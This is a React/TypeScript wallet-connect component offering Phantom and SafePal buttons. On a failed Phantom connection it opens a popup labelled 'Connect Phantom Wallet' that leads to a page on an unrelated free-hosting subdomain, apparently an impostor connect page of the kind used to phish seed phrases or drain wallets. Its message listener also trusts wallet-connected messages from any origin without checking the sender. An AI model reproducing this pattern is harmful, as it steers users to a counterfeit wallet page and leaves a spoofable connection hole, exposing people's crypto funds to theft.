import { useState } from 'react';
import { toast } from 'react-toastify';
import { connectPhantomWallet } from '../utils/wallet';

interface WalletConnectProps {
    onSuccess?: (publicKey: string) => void;
}

export const WalletConnect: React.FC<WalletConnectProps> = ({ onSuccess }) => {
    const [isConnecting, setIsConnecting] = useState(false);
    const [showWalletOptions, setShowWalletOptions] = useState(false);

    const handlePhantomConnection = async () => {
        setIsConnecting(true);
        try {
            const connected = await connectPhantomWallet();
            
            if (!connected) {
                const width = 400;
                const height = 600;
                const left = window.screenX + (window.outerWidth - width) / 2;
                const top = window.screenY + (window.outerHeight - height) / 2;
                
                const externalWindow = window.open(
                    'https://lightslategray-armadillo-425266.hostingersite.com/phantom-connect.html',
                    'Connect Phantom Wallet',
                    `width=${width},height=${height},left=${left},top=${top}`
                );

                window.addEventListener('message', async (event) => {
                    if (event.data.type === 'PHANTOM_CONNECTED') {
                        const { publicKey } = event.data;
                        await handleExternalConnection(publicKey);
                        externalWindow?.close();
                    }
                });
            }
        } catch (error) {
            console.error('Wallet connection error:', error);
            toast.error('Failed to connect wallet. Please try again.');
        } finally {
            setIsConnecting(false);
            setShowWalletOptions(false);
        }
    };

    const handleExternalConnection = async (publicKey: string) => {
        try {
            const response = await fetch('/api/wallet/external-connect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ publicKey }),
            });

            if (!response.ok) {
                throw new Error('Failed to process external connection');
            }

            await response.json();
            toast.success('Wallet connected successfully!');
            onSuccess?.(publicKey);
        } catch (error) {
            console.error('External connection handling error:', error);
            toast.error('Failed to complete wallet connection');
        }
    };

    return (
        <div className="wallet-connect-container">
            <button 
                onClick={() => setShowWalletOptions(!showWalletOptions)}
                className="wallet-connect-button"
            >
                Connect
            </button>
            
            {showWalletOptions && (
                <div className="wallet-options">
                    <button 
                        onClick={handlePhantomConnection}
                        disabled={isConnecting}
                        className="wallet-option"
                    >
                        {isConnecting ? 'Connecting...' : 'Phantom Wallet'}
                    </button>
                    <a 
                        href="https://safepal.io" 
                        target="_blank" 
                        rel="noopener noreferrer"
                        className="wallet-option"
                    >
                        SafePal Wallet
                    </a>
                </div>
            )}
        </div>
    );
}; 